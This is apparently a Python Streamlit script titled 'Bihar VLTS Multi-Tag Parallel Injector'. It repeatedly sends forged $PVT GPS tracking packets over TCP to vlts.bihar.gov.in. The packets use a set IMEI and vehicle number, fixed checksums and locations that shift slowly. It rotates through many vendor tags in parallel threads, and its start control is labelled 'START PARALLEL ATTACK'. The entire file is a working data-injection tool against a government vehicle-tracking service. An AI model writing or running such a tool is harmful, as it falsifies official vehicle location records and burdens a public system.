import streamlit as st
import socket
import time
import pandas as pd
import random
import threading
from datetime import datetime

st.set_page_config(page_title="Bihar VLTS Multi-Tag Pro", layout="wide")

if 'running' not in st.session_state:
    st.session_state.running = False

# --- Core Thread Function (No Logic Change) ---
def send_packet_thread(host, port, packet, tag, results_list):
    try:
        final_to_send = packet + "\r\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(5)
        s.connect((host, port))
        s.sendall(final_to_send.encode('ascii'))
        time.sleep(0.2)
        s.close()
        results_list.append({"TAG": tag, "Status": "✅ Accepted", "Time": datetime.now().strftime("%H:%M:%S")})
    except Exception as e:
        results_list.append({"TAG": tag, "Status": f"❌ Error", "Time": datetime.now().strftime("%H:%M:%S")})

st.title("🛰️ Bihar VLTS Multi-Tag Parallel Injector")

# --- STOP BUTTON ---
if st.session_state.running:
    if st.button("🛑 STOP ALL REQUESTS", type="primary", use_container_width=True):
        st.session_state.running = False
        st.rerun()

# --- SIDEBAR: TAG MASTER LIST ---
st.sidebar.header("⚙️ Tag & Server Settings")
server_host = st.sidebar.text_input("Host IP", "vlts.bihar.gov.in")
server_port = st.sidebar.number_input("Port", value=9999)
gap = st.sidebar.slider("Gap between Rounds (sec)", 0.5, 10.0, 2.0)

# Aapki list + Extra Bihar Tags
default_tags = "RA18, WTEX, MARK, ASPL, LOCT14A, ACT1, AMAZON, BBOX77, EGAS, MENT, MIJO, GRL, AIS140, MTRK, VLTD, VLT, GPS"
tags_input = st.sidebar.text_area("📋 Active TAG List:", value=default_tags, height=150)
tag_list = [t.strip() for t in tags_input.split(',') if t.strip()]

# --- INPUTS ---
c1, c2, c3 = st.columns(3)
with c1:
    imei = st.text_input("IMEI", "860560068639352")
    veh = st.text_input("Vehicle", "BR29GC1365")
with c2:
    base_lat = st.number_input("Start Lat", value=25.6489270, format="%.7f")
    base_lon = st.number_input("Start Lon", value=84.7841180, format="%.7f")
with c3:
    dt = st.text_input("Date/Time", "04022026,023800")
    fixed_cs = st.text_input("Checksum", "DDE3")

suffix = "0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041"

st.divider()

# --- LIVE MONITORING ---
st.subheader("📝 Live Parallel Transmission")
preview_area = st.empty() 

if not st.session_state.running:
    if st.button("🚀 START PARALLEL ATTACK", type="secondary", use_container_width=True):
        st.session_state.running = True
        st.rerun()

if st.session_state.running:
    status_area = st.empty()
    current_lat, current_lon = base_lat, base_lon
    
    while st.session_state.running:
        results = []
        threads = []
        all_strings = ""
        
        # Ek saath saare TAGS fire karna
        for t in tag_list:
            loc_str = f"{current_lat:.7f},N,{current_lon:.7f},E"
            packet = f"$PVT,{t},2.1.1,NR,01,L,{imei},{veh},1,{dt},{loc_str},{suffix},{fixed_cs}*"
            all_strings += f"[{t}] ➔ {packet}\n"
            
            thread = threading.Thread(target=send_packet_thread, args=(server_host, server_port, packet, t, results))
            threads.append(thread)
            thread.start()

        # Update Preview Box
        preview_area.text_area("Current Parallel Stream:", value=all_strings, height=300)

        # Wait for this batch to finish
        for thread in threads:
            thread.join()
        
        # Show Status Table
        status_area.table(pd.DataFrame(results))
        
        # Move Location thoda sa
        current_lat += 0.0001
        current_lon += 0.0001
        
        time.sleep(gap)
